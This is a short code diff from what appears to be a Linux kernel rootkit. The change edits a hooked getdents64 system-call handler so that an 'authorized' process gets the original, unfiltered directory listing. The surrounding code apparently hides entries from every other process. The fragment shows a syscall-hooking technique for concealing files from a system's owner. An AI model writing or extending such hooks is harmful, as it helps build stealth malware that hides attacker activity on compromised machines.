@@ -50,6 +50,11 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
     pr_info("[ROOTKIT] * Directory name: %s\n", s_pathname);
     kfree_const(s_pathname);
 
+    IF_U (is_process_authorized(PID_SELF)) {
+        pr_info("[ROOTKIT] * Process is authorized, bypassing checks...\n");
+        return i64_ret_orig;
+    }
+
     if (i64_ret_orig <= 0) {
         // No entries or error, return immediately
         IF_L (i64_ret_orig == 0) {
